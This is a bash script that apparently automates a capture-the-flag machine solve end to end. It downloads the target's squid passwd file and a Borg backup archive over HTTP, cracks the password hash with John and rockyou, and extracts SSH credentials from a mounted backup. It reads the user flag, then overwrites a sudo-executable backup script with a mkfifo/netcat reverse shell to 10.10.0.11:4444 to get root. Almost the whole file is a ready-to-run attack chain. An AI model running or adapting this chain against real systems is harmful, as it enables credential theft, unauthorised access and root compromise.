#!/bin/bash

TARGET_IP=$1
TARGET_PORT=$2


echo "Making The Magic on ${TARGET_IP}"
echo ""


if [[ -d  borg ]];then
    tput setaf 3; echo "[-] Borg Directory exist" 
    echo ""
else
    mkdir borg
fi

if [[ $(borgbackup --version)  ]];then
    echo "[-] BorgBackUp Installed"
else
    apt install borgbackup -y
fi

echo ""
wget -O /root/borg/passwd "http://"$TARGET_IP":"$TARGET_PORT"/etc/squid/passwd"  2>/dev/null
wget -O /root/borg/squid.conf "http://"$TARGET_IP":"$TARGET_PORT"/etc/squid/squid.conf" 2>/dev/null
wget -O /root/borg/archive.tar "http://"$TARGET_IP":"$TARGET_PORT"/admin/archive.tar" 2>/dev/null


if [[ -d /root/hash-identifier ]] && [[ -r /root/hash-identifier ]]; then

    echo "[-] Hash Identifier Exist"
    echo ""
else
    git clone https://github.com/blackploit/hash-identifier.git
    cd hash-identifier
    chmod +x hash-id.py
fi


if [[ -r "/root/borg/passwd" ]] && [[ -r "/root/borg/squid.conf" ]] && [[ -r "/root/borg/archive.tar" ]]; then
    tput setaf 2; echo "[+] Files are OK" ; tput sgr0
    echo ""
else
    echo "[-] Had Some issue with the files"
    echo ""
fi

PASSFILE="/root/borg/passwd"


CATED_PASS=$(cat $PASSFILE | sed 's/^.*://')

cat $PASSFILE | sed 's/^.*://' > /root/borg/mod_passwd
NEW_PASS_FILE="/root/borg/mod_passwd"


cat $PASSFILE | sed 's/\:.*//' > /root/borg/mod_user
NEW_CATED_USER="/root/borg/mod_user"

HASHTYPE=$(echo $CATED_PASS | python3 /root/hash-identifier/hash-id.py 2>/dev/null | grep "[+]" | awk '{print $2}')
tput setaf 2; echo "[+] The hash Type is: $HASHTYPE" ; tput sgr0
echo ""

tput setaf 2; echo "[+] Running john on $CATED_PASS"; tput sgr0
echo ""

/opt/john/john $NEW_PASS_FILE --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null 1>/dev/null


tput setaf 2; echo "[+] The PassPhrase is: $(/opt/john/john $NEW_PASS_FILE --show | head -n 1 | tr -d '[?:]')" 2>/dev/null; tput sgr0
echo ""
/opt/john/john $NEW_PASS_FILE --show | head -n 1 | tr -d '[?:]' > /root/borg/pass.txt

tar -xvf /root/borg/archive.tar -C /root/borg/ 1>/dev/null
tput setaf 2; echo "[+] Tar File Extracted to /root/borg"; tput sgr0
echo ""
echo "Running BorG on archive"
borgbackup list borg/home/field/dev/final_archive/
mkdir /mnt/borg_mnt
tput setaf 2; echo "[+] /mnt/borg_mnt Directory Created" ; tput sgr0
borgbackup mount borg/home/field/dev/final_archive/ /mnt/borg_mnt/
tput setaf 2; echo "[+] Archive mounted to /mnt/borg_mnt"; tput sgr0
echo ""
tput setaf 2; echo "Extracting password...." ; tput sgr0
sleep 2
tput setaf 2; echo "[+] Users SSH Credentials are: $(tail -1 /mnt/borg_mnt/music_archive/home/alex/Documents/note.txt)"; tput sgr0
echo ""
SSH_USER=$(tail -1 /mnt/borg_mnt/music_archive/home/alex/Documents/note.txt | sed 's/\:.*//' )
tput setaf 2; echo "[+] Use the credentials to access SSH..."; tput sgr0
echo ""
ssh $SSH_USER\@$TARGET_IP cat user.txt
echo ""
echo "User Flag ^ "
echo "Lets get The Root Flag :)"
echo ""
sleep 3
tput setaf 2; echo "[+++++] Please start nc -lvnp 4444 in other tab B4 Entering The Password [+++++]"; tput sgr0
echo ""
tput setaf 2; echo "Hit The password and enjoy the ROOT SHELL on the NC Tab"; tput sgr0
echo ""

ssh -t $SSH_USER\@$TARGET_IP <<'EOL'
    sudo chmod 777 /etc/mp3backups/backup.sh
    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.0.11 4444 >/tmp/f' > /etc/mp3backups/backup.sh
    sudo /etc/mp3backups/backup.sh
EOL